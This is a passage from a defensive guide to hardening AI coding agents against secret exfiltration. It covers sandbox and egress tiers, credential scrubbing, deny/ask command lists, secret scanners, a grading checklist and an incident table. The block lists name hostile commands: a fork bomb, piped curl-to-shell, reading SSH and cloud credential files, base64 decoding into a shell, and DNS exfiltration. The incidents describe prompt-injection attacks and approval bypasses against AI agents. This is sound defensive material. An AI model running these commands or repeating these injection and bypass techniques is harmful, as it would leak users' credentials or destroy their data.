Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys.
Without filesystem isolation … a compromised agent could backdoor system resources to gain network
access."* ([Sandboxing](https://code.claude.com/docs/en/sandboxing))

**Gotchas:** filesystem-only or network-only isolation is a half-measure; Claude Code's
`enableWeakerNestedSandbox` and `allowAppleEvents` materially weaken the boundary (the latter lets
sandboxed commands launch other apps *unsandboxed*); Codex `danger-full-access` and
`--dangerously-skip-permissions` / `--yolo` outside a container remove the boundary entirely.

### Tier 2 — Network egress allowlist (default-deny)

*Mechanisms:* iptables/nftables default-deny in a dev container; an authenticated forward proxy with
a domain allowlist; a container network namespace with no route; a firewall on the VM.

Concrete: Anthropic's reference dev container ships *"a default-deny iptables firewall"* and is the
supported way to run `--dangerously-skip-permissions`
([Sandbox environments](https://code.claude.com/docs/en/sandbox-environments)). GitHub Copilot's
cloud agent has a built-in firewall with a recommended allowlist, tunable via
`COPILOT_AGENT_FIREWALL_ALLOW_LIST_ADDITIONS` / `COPILOT_AGENT_FIREWALL_ALLOW_LIST`
([GitHub Docs](https://docs.github.com/en/copilot/how-tos/use-copilot-agents/coding-agent/customize-the-agent-firewall)).
Claude Code on the web runs each session in an Anthropic-managed VM behind a default allowlist proxy,
with git pushes *restricted to the current working branch*
([Security](https://code.claude.com/docs/en/security)).

**Stops:** the majority of naive exfil; `curl` to an attacker host; most package-registry
side-channels if registries are excluded.

**Does not stop:** DNS exfil unless DNS itself is confined to a controlled resolver that blocks
novel subdomains; data smuggled to an *allowed* domain (a gist, a PR, a public repo); MCP servers
and setup steps that run outside the enforcement point (explicitly true for Copilot's firewall);
domain fronting past a proxy that trusts the client's SNI/Host.

**Design rules:** default deny; allowlist the narrowest hosts that make the build work; **exclude
`github.com` write paths and pastebins from the allowlist wherever possible**; force all DNS through
a resolver you control; log every block (Copilot surfaces blocked requests as PR comments — a good
pattern to copy).

### Tier 3 — Credential removal from the environment

*Mechanisms:* don't export secrets in the shell you launch the agent from; per-project `.envrc` that
loads only what's needed; short-lived tokens; env scrubbing at the harness boundary; credential
masking proxies.

Concrete: Claude Code's `sandbox.credentials.envVars` supports `"mode": "deny"` (variable unset
inside the sandbox) and `"mode": "mask"` (the command sees a per-session sentinel; the sandbox proxy
substitutes the real value only on requests to `injectHosts`, requiring `network.tlsTerminate`; AWS
SigV4 requests are re-signed via `credentials.awsPairs`). `sandbox.credentials.files` does the same
for files (sentinel copies on Linux/WSL2; a hard read block on macOS). `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`
strips Anthropic and cloud-provider credentials from *all* subprocesses regardless of sandboxing.
Critically: *"There is no built-in credential deny list, so only the files and variables you list are
restricted."* ([Sandboxing → Protect credentials](https://code.claude.com/docs/en/sandboxing))

**Stops:** the single most common accidental leak — `env`/`printenv` dumping a token into the
transcript; and tokens reaching an attacker even when a request escapes (masking).

**Does not stop:** secrets read from files the agent may read; ambient auth that lives in files
rather than env (`~/.aws/credentials`, `gh` hosts.yml) unless you also deny/mask those; secrets the
build re-derives at runtime.

**Best current practice:** launch the agent from a shell with *no* production credentials exported;
prefer file-based, short-lived, narrowly scoped credentials that a `deny` rule can cover; keep a
separate low-privilege profile for agent sessions.

### Tier 4 — Harness deny rules on paths, tools, and commands

Pre-execution rule engines inside the harness. Deterministic, but they bind the *harness's* tools —
not arbitrary subprocesses.

Syntax varies; the semantics to look for are the same everywhere:
- **Claude Code**: `permissions.{allow, ask, deny}` with `Bash(git push *)`, `Read(./.env)`,
  `Edit(...)`, `WebFetch(domain:example.com)`, `mcp__server__tool`. Evaluation order is **deny → ask
  → allow, first match wins, specificity does not change the order**; a bare tool name in `deny`
  removes the tool from the model's context entirely; Read/Edit rules use gitignore pattern syntax
  with `//abs`, `~/home`, `./relative` anchors; symlinks are checked on both the link and its target
  and deny blocks outright ([Permissions](https://code.claude.com/docs/en/permissions)).
- **OpenCode**: `"permission": { "*": "ask", "bash": {"*":"ask","git *":"allow","rm *":"deny"},
  "edit": {...}, "webfetch": {...} }` with per-agent overrides
  ([OpenCode permissions](https://opencode.ai/docs/permissions/)).
- **Codex CLI**: `approval_policy` + `sandbox_mode` + execution policy rules
  ([Codex sandboxing](https://developers.openai.com/codex/sandboxing)).
- **Cursor**: allowlist-based Auto-Run (the denylist was deprecated after the Backslash disclosure).

**Stops:** the harness's own Read/Edit/Bash/WebFetch calls matching the pattern; removes a whole
tool from the model's context (the strongest form — the model cannot attempt what it can't see).

**Does not stop:**
- **Arbitrary subprocesses.** Anthropic is explicit that Read/Edit deny rules cover built-in tools
  and recognised file commands (`cat`, `head`, `sed`) but *"don't apply to arbitrary subprocesses
  that read or write files indirectly, like a Python or Node script that opens files itself. For
  OS-level enforcement that blocks all processes from accessing a path, enable the sandbox."*
- **Argument injection** and wrapper/interpreter evasion. Claude Code strips a fixed wrapper list
  (`timeout`, `time`, `nice`, `nohup`, `stdbuf`, `command`, `builtin`, `noglob`, bare `xargs`) but
  explicitly *not* `direnv exec`, `devbox run`, `mise exec`, `npx`, `docker exec` — so
  `Bash(devbox run *)` matches `devbox run rm -rf .`.
- **Encoding/obfuscation** (`base64 -d | sh`, subshells) against a denylist.
- Anything the model routes through an MCP tool instead of Bash.

**Rule-design lessons worth copying:** deny before allow; a deny rule cannot carry allowlist
exceptions (a broad `Bash(aws *)` deny beats a narrow `Bash(aws s3 ls)` allow); wildcards before the
subcommand are dangerous (`Bash(git * main)` matches `git push origin main` *and* `git -c
core.fsmonitor=<script> diff main`); output redirection targets are checked as writes.

### Tier 5 — Hooks / programmable pre-tool gates

A deterministic program that inspects a tool call before it executes and can block it (Claude Code
`PreToolUse`/`ConfigChange` hooks, Codex lifecycle hooks, MCP proxies such as Invariant's
[MCP-Scan](https://invariantlabs.ai/blog/introducing-mcp-scan) in proxy mode).

**Stops:** whatever you can express in code and the harness routes through the hook — e.g. reject
any Bash command containing a base64 blob, any write to `.git/hooks`, any `gh repo create --public`,
any tool call whose arguments contain a string matching a secret regex (an *outbound* DLP check).

**Does not stop:** anything outside the hook's trigger surface; a compromised session that rewrites
its own hook config (hence Claude Code's `ConfigChange` hooks and admins-only
`allow_managed_hooks_only = true` in Codex `requirements.toml`); the hook's own bugs.

**Underused idea:** hooks are the only place you can implement *content-based* egress DLP —
scanning a proposed `curl`/`WebFetch`/MCP argument for anything that looks like a credential before
it leaves. Recommended; not shipped by default in any harness surveyed `[unverified]`.

### Tier 6 — Ignore files (indexing/convenience only)

`.gitignore`, `.cursorignore`, `.cursorindexingignore`, `.aiexclude`, `.codeiumignore`,
`.aiignore`.

**These are not security boundaries.** Cursor's own docs: *"Cursor blocks ignored files from [Agent,
Tab, Inline Edit, @-mentions], but complete protection isn't guaranteed due to LLM
unpredictability,"* and *"The terminal and MCP server tools used by Agent cannot block access to
code governed by `.cursorignore`"* ([Cursor docs](https://cursor.com/docs/context/ignore-files)).
`.gitignore` governs git only — it has never governed reads.

**Stops:** accidental indexing/embedding of a path; casual @-mention inclusion; noise.

**Does not stop:** `cat`, any subprocess, any MCP server, and — per the vendor — the model itself
reliably.

**Use them anyway** (cheap, reduces accidental inclusion), but never *count* them. Anything you'd be
harmed by should also have a Tier 1/3/4 control.

### Tier 7 — Instructions in `AGENTS.md` / `CLAUDE.md` / rules files (advisory only)

"Never read `.env`", "always ask before pushing". These are *prompts*. They are subject to the same
instruction/data confusion as everything else: they compete with injected instructions, they are
sometimes dropped under context pressure, and they are unenforceable by construction (§0.3).

**Stops:** nothing, adversarially. Reduces well-intentioned model error, which is genuinely worth
something.

**Does not stop:** anything an attacker does. Worse — these files are themselves an injection
carrier and a leak surface (§1a).

**Corollary for skill authors:** never present an `AGENTS.md` rule as a mitigation for a Critical
finding. Pair it with an enforced rule and say which one is doing the work.

### 3.8 What a human-approval ("ask") gate should cover

`ask` is stronger than `deny` for anything with legitimate uses: it preserves capability while
keeping a human in the loop. Gate at minimum:

| Gate | Why |
|---|---|
| Any outbound network call not on the allowlist (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `WebFetch`, browser tools) | Primary exfil channel |
| `git push`, `git remote add`, `git config` changes to remotes/hooks/`insteadOf` | Exfil by push; persistence |
| Creating public artifacts: `gh repo create`, `gh gist create`, `gh pr create`, `gh issue create` | The s1ngularity and GitHub-MCP exfil route |
| Package publish: `npm publish`, `twine upload`, `cargo publish`, `gem push`, `docker push`, `nuget push` | Exfil + downstream poisoning |
| Reading credential directories and files (`~/.ssh`, `~/.aws`, `~/.config/gcloud`, `~/.azure`, `~/.kube`, `~/.docker`, `~/.gnupg`, `~/.netrc`, `~/.git-credentials`, browser profiles, `**/.env*`) | Disclosure; usually deny, ask only if genuinely needed |
| Env/identity enumeration (`env`, `printenv`, `set`, `ifconfig`/`ipconfig`, `whoami`, `hostname`, `id`) | Disclosure + fingerprinting |
| Elevated privileges: `sudo`, `doas`, `runas`, `Start-Process -Verb RunAs`, `su`, anything with `--privileged` | Escapes the boundary |
| Destructive commands: `rm -rf`, `git reset --hard`, `git clean -fdx`, `git push --force`, `DROP`/`TRUNCATE`, `terraform apply/destroy`, `kubectl delete`, `aws s3 rm`, `Remove-Item -Recurse -Force`, disk/format tooling | Amazon Q incident (§7) |
| Production-scoped CLI calls: any `aws`/`gcloud`/`az`/`kubectl` write verb, `psql`/`mysql` against a non-local host | Blast radius |
| Installing or enabling a new MCP server, plugin, skill, or extension | New capability = new trifecta leg |
| Editing agent configuration itself (`.claude/settings.json`, `.mcp.json`, hooks, `AGENTS.md`) | Self-escalation and persistence |
| Modifying `.git/hooks`, shell rc files, or anything on `$PATH` | Persistence |

Two caveats on approval gates. (1) **Approval fatigue is a real failure mode** — a gate that fires
50 times a session gets click-through-approved; that is why sandbox + allowlist should absorb the
routine cases and leave `ask` for the genuinely consequential ones. (2) **Approval prompts can lie
to you**: Trail of Bits bypassed human approval by injecting *arguments* into commands the human had
already approved, and Invariant showed MCP approval dialogs truncating the malicious portion of a
tool description.

---

## 4. Recommended universal deny / ask lists

Harness-agnostic. Translate into your harness's syntax (Claude Code `Read(...)`/`Bash(...)`,
OpenCode `permission.bash`, Codex execution policy, Cursor allowlist).

### 4.1 Path globs — deny reads

```
# Repo-local secrets
**/.env
**/.env.*
!**/.env.example          # optional re-allow; only if you have verified it holds no real values
**/.envrc
**/*.pem
**/*.key
**/*.p12
**/*.pfx
**/*.jks
**/*.keystore
**/*.asc
**/*.gpg
**/id_rsa*
**/id_dsa*
**/id_ecdsa*
**/id_ed25519*
**/*.ppk
**/.netrc
**/_netrc
**/.pgpass
**/.my.cnf
**/.npmrc
**/.pypirc
**/.yarnrc.yml
**/kubeconfig
**/*.kubeconfig
**/terraform.tfstate
**/terraform.tfstate.backup
**/*.tfvars
**/.terraform/**
**/secrets/**
**/*secret*.json
**/*credential*.json
**/serviceAccount*.json
**/firebase-adminsdk-*.json
**/*.har
**/.git/config
**/.git/credentials
**/.mcp.json

# Home-directory credential stores  (Claude Code form: ~/… ; portable form: //**/…)
~/.ssh/**
~/.aws/**
~/.azure/**
~/.config/gcloud/**
~/.kube/**
~/.docker/**
~/.gnupg/**
~/.netrc
~/.authinfo*
~/.git-credentials
~/.config/git/credentials
~/.config/gh/**
~/.npmrc
~/.pypirc
~/.cargo/credentials*
~/.gem/credentials
~/.m2/settings.xml
~/.gradle/gradle.properties
~/.nuget/NuGet.Config
~/.composer/auth.json
~/.terraform.d/**
~/.password-store/**
~/.config/1Password/**
~/.local/share/keyrings/**
~/Library/Keychains/**
~/.bash_history
~/.zsh_history
~/.*_history
~/.local/share/fish/fish_history

# Other agents' credentials and transcripts
~/.claude/.credentials.json
~/.claude.json
~/.claude/projects/**
~/.codex/auth.json
~/.codex/sessions/**
~/.gemini/oauth_creds.json
~/.cursor/**
~/.config/opencode/**
~/.aider*

# Browser profiles (POSIX examples; add the Windows/macOS forms you need)
~/.config/google-chrome/**
~/.config/chromium/**
~/.mozilla/**
~/Library/Application Support/Google/Chrome/**
~/Library/Application Support/Firefox/**

# Windows-specific (paths normalise differently — see note below)
//c/Users/*/AppData/Roaming/gh/**
//c/Users/*/AppData/Roaming/npm/etc/npmrc
//c/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
//c/Users/*/AppData/Local/Google/Chrome/User Data/**
//c/Users/*/AppData/Local/Microsoft/Edge/User Data/**
//c/Users/*/.aws/**
//c/Users/*/.ssh/**
//c/Users/*/.kube/**
//c/Users/*/.azure/**
```

> **Windows path note.** Claude Code normalises Windows paths to POSIX form before matching:
> `C:\Users\alice` becomes `/c/Users/alice`, so use `//c/**/.env` for one drive or `//**/.env` for
> all drives ([Permissions](https://code.claude.com/docs/en/permissions)). Other harnesses differ —
> verify, don't assume. A POSIX-only denylist on a Windows box is a silent no-op.

> **Anchor note.** In Claude Code, a bare `Read(.env)` is equivalent to `Read(**/.env)` but is
> anchored at the *current directory*; a user-settings rule like `Read(/secrets/**)` resolves
> relative to `~/.claude`, not to each project. Use `//` (filesystem root) or `~/` anchors for rules
> meant to apply everywhere.

### 4.2 Command patterns — deny or gate

**Deny outright** (no legitimate use in a normal coding session):

```
sudo *            doas *            su *              runas *
chmod 777 *       chown -R *
mkfs*             dd if=* of=/dev/*  diskutil *       format *
:(){ :|:& };:
curl * | sh       curl * | bash     wget * | sh       iwr * | iex
history           cat ~/.bash_history   cat ~/.zsh_history
cat ~/.ssh/*      cat ~/.aws/*      cat ~/.netrc      cat ~/.git-credentials
gpg --export-secret-keys *
security dump-keychain *          # macOS
```

**Gate with `ask`** (legitimate but consequential):

```
# Network egress
curl *   wget *   nc *   ncat *   socat *   telnet *   openssl s_client *
ssh *    scp *    sftp *   rsync *
ping *   dig *    nslookup *   host *          # DNS exfil — CVE-2025-55284
Invoke-WebRequest *   Invoke-RestMethod *   iwr *   curl.exe *   bitsadmin *   certutil -urlcache *

# Environment / identity disclosure
env      printenv *   set      export -p    declare -x
Get-ChildItem Env:*   dir env:*
whoami *   hostname *   id      groups   klist *   dsregcmd *
ifconfig *   ipconfig *   ip a*   ip addr*   getmac *   netstat *   lsof -i*
uname -a   systeminfo   sw_vers
aws sts get-caller-identity   gcloud config list   az account show   gh auth status

# Version-control egress and persistence
git push *        git remote add *      git remote set-url *
git config *      git config --global *
gh repo create *  gh gist create *      gh pr create *   gh issue create *   gh api *

# Publishing
npm publish *   yarn publish *   pnpm publish *   twine upload *   python -m twine *
cargo publish * gem push *       docker push *    nuget push *     helm push *

# Ambient-auth infrastructure
docker *   podman *   kubectl *   helm *   terraform *   pulumi *
aws *   gcloud *   az *   doctl *   flyctl *   vercel *   heroku *   stripe *
psql *   mysql *   mongo*   redis-cli *

# Destructive
rm -rf *   git reset --hard *   git clean -fd*   git push --force*   git push -f*
Remove-Item -Recurse -Force *
DROP *   TRUNCATE *
terraform destroy *   terraform apply *   kubectl delete *   aws s3 rm *

# Interpreters that trivially defeat command patterns — gate or sandbox
python -c *   python3 -c *   node -e *   node --eval *   ruby -e *   perl -e *   php -r *
bash -c *     sh -c *        eval *      base64 -d *     xxd -r *
```

### 4.3 Env-var patterns to scrub

Use the §1(c) list. Prefer **mask over deny** where a tool genuinely needs the credential (Claude
Code's `mask` + `injectHosts` model); prefer **deny** for anything the session shouldn't use at all.
Set a global subprocess scrub (`CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` or equivalent) as a backstop, and
remember there is **no built-in credential deny list** in Claude Code — an empty
`sandbox.credentials` means no protection.

### 4.4 False-positive tradeoffs (say these out loud in any report)

| Rule | Breaks | Mitigation |
|---|---|---|
| Deny `**/.env*` | Projects where the agent must legitimately edit `.env.example`, or scaffold a new `.env` | Re-allow the specific example file only after verifying it has no real values; or use `ask` |
| Deny `~/.aws/**`, `~/.config/gh/**` | `aws`, `gh`, `terraform` stop authenticating entirely — Anthropic notes `deny` *"also breaks tools that need it, such as `gh` or `npm`"* | Use `mask` with `injectHosts`, or run those commands outside the sandbox with explicit approval |
| Deny/gate `curl`, `wget` | Health checks, `curl localhost:3000` during dev, install scripts | Allowlist `localhost`/`127.0.0.1` and known-good domains; use the harness's `WebFetch(domain:…)` instead of raw curl, as Anthropic recommends |
| Gate `ping`/`dig`/`nslookup` | Routine network debugging | Accept the friction: this is the DNS exfil channel and it defeats HTTP allowlists |
| Gate `docker *` | Almost every containerised workflow | Allow specific read verbs (`docker ps`, `docker logs`) and gate `run`/`exec`/`push`; **never** mount `docker.sock` into the sandbox |
| Gate `git push *` | Normal contribution flow; very high prompt frequency | Restrict to the current branch (Claude Code on the web does this) rather than gating every push; keep force-push gated |
| Deny `env`/`printenv` | Debugging env issues; some build tooling shells out to `env` | Prefer scrubbing the environment so `env` is harmless, over blocking `env` |
| Broad `Bash(git *)` allow | Silently permits `git push`, and `git -c core.fsmonitor=<script>` = arbitrary execution | Never wildcard before the subcommand |
| Denylists in general | Bypassable by base64/subshell/interpreter | Prefer allowlists; Cursor deprecated its denylist for exactly this |
| Path rules only | Any agent-written script bypasses them | Pair every path rule with OS-level sandbox `denyRead` |

---

## 5. Secret-scanning tooling to run alongside

These answer *"is there already a secret in reach?"* — a precondition check before you point an
agent at a repo. They do **not** address exfiltration.

| Tool | Install | Core run | Notes |
|---|---|---|---|
| **gitleaks** | `brew install gitleaks` / `docker pull zricethezav/gitleaks:latest` | `gitleaks dir -v .` (worktree, incl. untracked)<br>`gitleaks git -v .` (full history via `git log -p`) | Exit `0` clean, `1` leaks/error. `detect`/`protect` deprecated as of v8.25.0 in favour of `git`/`dir`/`stdin`. `--baseline-path` to suppress known findings; `-f sarif`. ([repo](https://github.com/gitleaks/gitleaks)) |
| **TruffleHog** | `brew install trufflehog` or `curl -sSfL .../install.sh \| sh -s -- -b /usr/local/bin` | `trufflehog filesystem . --results=verified`<br>`trufflehog git file://. --results=verified` | **Verification** actively tests candidates against the provider API → verified / unverified / unknown. Verified findings mean *live* credentials: rotate, don't just delete. ([repo](https://github.com/trufflesecurity/trufflehog)) |
| **detect-secrets** | `pip install detect-secrets` | `detect-secrets scan > .secrets.baseline`<br>`detect-secrets audit .secrets.baseline` | Baseline model: audit once, then block only *new* secrets. Good for legacy repos with unavoidable noise. ([repo](https://github.com/Yelp/detect-secrets)) |
| **git-secrets** | `brew install git-secrets` | `git secrets --install && git secrets --register-aws`<br>`git secrets --scan` / `--scan-history` | AWS-focused; installs `pre-commit`, `commit-msg`, `prepare-commit-msg` hooks. Global template: `git secrets --install ~/.git-templates/git-secrets && git config --global init.templateDir ~/.git-templates/git-secrets`. ([repo](https://github.com/awslabs/git-secrets)) |
| **pre-commit** | `pip install pre-commit && pre-commit install` | `pre-commit run --all-files` | Orchestrator. gitleaks hook: `repo: https://github.com/gitleaks/gitleaks`, `id: gitleaks`. Bypassable with `SKIP=gitleaks` — a developer convenience, not a control. |
| **GitHub secret scanning + push protection** | Repo/org setting | n/a | Scans *entire git history on all branches*, plus issues, PRs, discussions, wikis, and gists. Push protection blocks pushes containing secrets from CLI, UI, REST API, **and the GitHub MCP server**. Limits: **push protection for users only works on public repos**; anyone with write access can bypass with a reason unless delegated bypass is configured. ([about secret scanning](https://docs.github.com/en/code-security/secret-scanning/introduction/about-secret-scanning), [push protection](https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection)) |

### "Before enabling an agent" check

```bash
# 1. Worktree scan INCLUDING untracked and ignored files — this is what the agent can read.
gitleaks dir -v --no-banner .

# 2. History scan — secrets deleted from HEAD are still readable via git log / git show.
gitleaks git -v --no-banner .

# 3. Live-credential triage: verified findings are active and must be rotated, not deleted.
trufflehog filesystem . --results=verified --no-update

# 4. What is actually on disk that git never sees.
git status --ignored --porcelain | head -50
find . -name '.env*' -o -name '*.pem' -o -name '*.key' -o -name '*.tfstate' -o -name '*.har' \
  | grep -v node_modules

# 5. Tokens hidden in git plumbing.
git remote -v
git config --local --list | grep -Ei 'url|token|password'

# 6. Symlinks that escape the repo.
find . -type l -not -path './node_modules/*' -exec ls -ld {} +

# 7. The shell the agent will inherit.
env | grep -Ei '(_KEY|_TOKEN|_SECRET|_PASSWORD|_CREDENTIAL|AWS_|GITHUB_TOKEN|DATABASE_URL)' | cut -d= -f1
```

Interpretation rules:
- A finding in **history only** is still Critical — the agent can run `git log -p`.
- **Deletion is not remediation.** A verified live credential requires rotation/revocation.
- Report *names and locations*, never values, so the report itself isn't a new leak surface.
- Clean scans mean "no *known-pattern* secret found". They say nothing about PII in fixtures,
  confidential source, or internal architecture — the disclosure question is separate (see the
  `repo-disclosure` skill).

---

## 6. Scanner checklist — grading a repo + machine for agent hardening

A proposed check set for a hardening-grader skill. Severity = default; escalate one level if the
provider retains/trains on transcripts, if the repo is employer- or client-owned, or if the machine
holds production credentials.

### A. Secrets in reach

| # | Check | Sev |
|---|---|---|
| A1 | Secret-shaped files present in worktree (`.env*`, `*.pem`, `*.key`, `*.p12`, `id_rsa`, `*.tfstate`, `.npmrc`, `serviceAccount*.json`, `.har`) | **Critical** |
| A2 | `gitleaks dir` finds secrets in the worktree (tracked, untracked, or ignored) | **Critical** |
| A3 | `gitleaks git` / `trufflehog` finds secrets in history only | **Critical** |
| A4 | TruffleHog reports **verified** (live) credentials | **Critical** — rotate now |
| A5 | `.git/config` or `git remote -v` contains an embedded token | **Critical** |
| A6 | Notebook outputs, `*.har`, screenshots, or `fixtures/`+`*.sql`/`*.csv` dumps present | **High** (Critical if real PII) |
| A7 | Symlinks resolving outside the repo | **High** |
| A8 | `.gitignore` is being relied on to hide secrets (they're on disk) | **High** |
| A9 | MCP config file (`.mcp.json`, `.cursor/mcp.json`) contains a literal token in `env` | **Critical** |

### B. Machine and process state

| # | Check | Sev |
|---|---|---|
| B1 | Secret-looking env vars exported in the launching shell (name-pattern match, values never reported) | **High** |
| B2 | Credential dirs present and readable: `~/.ssh`, `~/.aws`, `~/.config/gcloud`, `~/.azure`, `~/.kube`, `~/.docker`, `~/.gnupg`, `~/.netrc`, `~/.git-credentials` | **High** (Critical if no `denyRead` covers them) |
| B3 | `SSH_AUTH_SOCK` set (agent forwarding available to the agent) | **High** |
| B4 | Running on a cloud instance / CI runner where `169.254.169.254` is reachable, or IMDSv1 permitted | **Critical** |
| B5 | `/var/run/docker.sock` reachable from the agent's boundary | **Critical** |
| B6 | Valid `~/.kube/config` pointing at a non-local cluster | **High** |
| B7 | Sibling repos from other owners/clients under a parent of the working directory | **High** |
| B8 | Agent running as root/Administrator, or elevated shell | **High** |
| B9 | Shell history files readable and non-empty | **Medium** |
| B10 | Corporate VPN / mesh (`tailscale`, `wg`) active during the session | **Medium** |

### C. Harness configuration

| # | Check | Sev |
|---|---|---|
| C1 | No harness config present at all (all defaults) | **High** |
| C2 | **Auto/YOLO mode enabled** (`--dangerously-skip-permissions`, `--yolo`, `--trust-all-tools`, Cursor Auto-Run, `approval_policy = "never"`, `sandbox_mode = "danger-full-access"`) **outside a container/VM** | **Critical** |
| C3 | Sandbox not enabled (`sandbox.enabled` false / `GEMINI_SANDBOX` unset / Gemini `permissive-open` profile / native Windows host with no container) | **High** |
| C4 | Sandbox enabled but `filesystem.disabled: true`, or `allowRead` re-opens `~` | **High** |
| C5 | Network unrestricted (no `allowedDomains` / no egress firewall / `*-open` Seatbelt profile) | **High** |
| C6 | Egress allowlist present but overly broad (`github.com`, `*`, pastebins, or a rule that admits user-writable content) | **Medium** |
| C7 | Deny rules do **not** cover `.env` / `.env.*` | **High** |
| C8 | Deny rules do **not** cover home credential dirs | **High** |
| C9 | No env-var scrubbing/masking configured (`sandbox.credentials` empty, no subprocess scrub) | **High** |
| C10 | Broad allow rules present (`Bash(git *)`, `Bash(*)`, wildcard-before-subcommand, `WebFetch(domain:*)`) | **High** |
| C11 | Denylist-style command rules used where an allowlist is available | **Medium** |
| C12 | Unix sockets allowed through the sandbox (esp. `docker.sock`) | **Critical** |
| C13 | Weakening flags set: `enableWeakerNestedSandbox`, `allowAppleEvents`, `allowAllUnixSockets`, `enableWeakerNetworkIsolation`, `ignoreViolations` | **High** |
| C14 | Project-scope settings (`.claude/settings.json`, committed rules) grant permissions — i.e. the *repo* can widen the agent's authority | **High** |
| C15 | No managed/org-level settings pinning the policy (team context only) | **Medium** |
| C16 | Hooks configured for pre-tool gating? (absence = missed opportunity, not a vuln) | **Low** |
| C17 | Ignore files (`.cursorignore` etc.) are the *only* protection for a sensitive path | **High** |
| C18 | `AGENTS.md`/`CLAUDE.md` instruction is the *only* protection for a sensitive path | **High** |
| C19 | Trust prompt bypassed by non-interactive mode (`-p`, headless) on an unreviewed repo | **Medium** |

### D. Connected tools

| # | Check | Sev |
|---|---|---|
| D1 | MCP servers configured with broad scope (filesystem rooted above the repo; DB server pointing at prod; org-wide GitHub PAT) | **Critical** |
| D2 | Third-party/unvetted MCP servers enabled | **High** |
| D3 | MCP servers run outside the sandbox/egress boundary (true by default for the built-in Bash sandbox, and stated for Copilot's firewall) | **High** |
| D4 | Ambient-auth CLIs authenticated and ungated (`gh auth status`, `aws sts`, `gcloud`, `az`, `kubectl` all succeed with no `ask` rule) | **High** |
| D5 | Browser/computer-use tool enabled with a logged-in profile | **Critical** |
| D6 | Same credential spans public and private scopes (the GitHub-MCP failure mode) | **Critical** |
| D7 | Plugins/skills/extensions installed from unvetted sources | **High** |

### E. Untrusted-content exposure

| # | Check | Sev |
|---|---|---|
| E1 | Session will read third-party content: issues, PRs, external web pages, dependency source | **High** — trifecta leg 2 |
| E2 | Repo contains agent-instruction files from an untrusted contributor (`AGENTS.md`, `.cursor/rules`, `.github/copilot-instructions.md`, skills) | **High** |
| E3 | Repo contains suspicious hidden-instruction markers (invisible Unicode tags, zero-width chars, HTML comments with imperative text, base64 blobs in docs) | **High** |
| E4 | Working on an untrusted/forked/unreviewed repo without VM isolation | **Critical** |

### F. Provider and transcript

| # | Check | Sev |
|---|---|---|
| F1 | Provider tier retains or trains on transcripts (or terms unknown → assume yes) | **High** — drives escalation of everything above |
| F2 | Prior session transcripts on disk are readable by the current session (`~/.claude/projects/**` etc. not denied) | **High** |
| F3 | Telemetry/OTel exporters shipping prompt or tool metadata off-box | **Medium** |
| F4 | Memory files writable by the session (injection persistence) | **High** |

### Suggested grading

- Any **Critical** open → **DO NOT RUN** until remediated or an enforced boundary removes it from
  reach.
- ≥3 **High** → **HARDEN FIRST**.
- Only **Medium/Low** → **RUN WITH CARE**, listing residual risk.
- Report every finding as *type + location + why it matters + the enforced control that fixes it*.
  Never include secret values. Say explicitly which controls are enforced (Tier 1–5) and which are
  advisory (Tier 6–7).

---

## 7. Incident appendix (grounding for "this actually happens")

| Incident | Date | What it demonstrates |
|---|---|---|
| **GitHub MCP data heist** — Invariant Labs | 2025-05-26 | Prompt injection in a *public* repo issue → agent used the same PAT to read private repos and publish contents in a public PR. Not a code bug; a **scope/architecture** failure. No external host needed. ([Invariant](https://invariantlabs.ai/blog/mcp-github-vulnerability), [issue #844](https://github.com/github/github-mcp-server/issues/844), [devclass](https://devclass.com/2025/05/27/researchers-warn-of-prompt-injection-vulnerability-in-github-mcp-with-no-obvious-fix/)) |
| **MCP tool poisoning / WhatsApp rug-pull** — Invariant Labs | 2025 | Tool *descriptions* are untrusted input; a server can serve benign descriptions first and malicious ones later; approval dialogs truncate the payload. ([Invariant](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)) |
| **EchoLeak** CVE-2025-32711, M365 Copilot, CVSS 9.3 — Aim Security | 2025-06 | Zero-click exfiltration via a single crafted email; "LLM scope violation"; operates in natural-language space so AV/firewalls/static scanning don't see it. ([HackTheBox](https://www.hackthebox.com/blog/cve-2025-32711-echoleak-copilot-vulnerability)) |
| **Cursor Auto-Run denylist bypass** — Backslash Security | 2025-07 | Denylists lose to base64 and subshells; Cursor deprecated the denylist for an allowlist. ([Backslash](https://www.backslash.security/blog/cursor-ai-security-flaw-autorun-denylist), [The Register](https://www.theregister.com/2025/07/21/cursor_ai_safeguards_easily_bypassed/)) |
| **Amazon Q VS Code extension wiper** | 2025-07 | A PR from an outside contributor merged a prompt instructing the agent to delete local files, S3 buckets, EC2 instances and IAM users; shipped in v1.84.0 to a ~1M-install extension. AWS says a formatting error prevented execution. **Supply chain into the agent itself.** ([SC Media](https://www.scworld.com/news/amazon-q-extension-for-vs-code-reportedly-injected-with-wiper-prompt), [AWS-2025-019](https://aws.amazon.com/security/security-bulletins/AWS-2025-019)) |
| **Claude Code DNS exfiltration** CVE-2025-55284 — Johann Rehberger | 2025-08 | Injection in analysed code exfiltrated `.env` contents as DNS subdomains via auto-approved `ping`/`nslookup`/`dig`; **HTTP allowlists don't cover DNS.** Fixed by removing those from the allowlist. ([Embrace The Red](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/)) |
| **Nx "s1ngularity" supply-chain attack** | 2025-08-26 | Malicious npm postinstall harvested SSH keys, npm/GitHub tokens, `.env`s and wallet files — and **invoked locally installed AI CLIs (Claude, Gemini, Q) with `--dangerously-skip-permissions`, `--yolo`, `--trust-all-tools`** to accelerate recon. Loot pushed to a public `s1ngularity-repository` in the victim's own GitHub account. 2,349 credentials, 1,700+ users, 6,700+ private repos exposed. **The single most important incident for this threat model: your agent's yolo flag is now part of other malware's toolkit.** ([GitGuardian](https://blog.gitguardian.com/the-nx-s1ngularity-attack-inside-the-credential-leak/), [Wiz](https://www.wiz.io/blog/s1ngularitys-aftermath), [The Hacker News](https://thehackernews.com/2025/08/malicious-nx-packages-in-s1ngularity.html)) |
| **Prompt injection → RCE in AI agents** — Trail of Bits | 2025-10 | Argument injection into *already-approved* commands bypassed human-in-the-loop in three agent platforms. Approval gates are not a boundary. ([Trail of Bits](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/)) |
